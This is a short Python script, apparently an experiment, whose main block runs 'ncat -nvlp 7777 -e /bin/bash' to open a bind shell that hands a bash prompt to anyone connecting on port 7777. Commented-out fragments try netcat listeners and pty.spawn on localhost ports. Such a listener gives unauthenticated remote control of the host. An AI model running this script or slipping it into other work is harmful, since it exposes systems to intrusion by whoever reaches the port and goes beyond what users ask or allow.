import os
from platform import platform
import sys
import pty
import subprocess, threading



# print(sys.platform)
# print(os.name)
# print(platform.system())

# pty.spawn("/bin/bash /usr/local/bin/netcat 127.0.0.1 1337")
# pty.spawn("")

# def startTTY():
#     out = process.stdout.read() #Read
# process = subprocess.Popen("/usr/local/bin/netcat -lv 127.0.0.1 -p 1337", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
# tty = threading.Thread(startTTY()) #Start netcat shell listening on 8081
# tty.start() #Start the thread


if __name__ == "__main__":
    import os

    netcat = 'ncat -nvlp 7777 -e /bin/bash'
    print ("Starting listener on port 7777")
    from subprocess import call
    call(netcat,shell=True)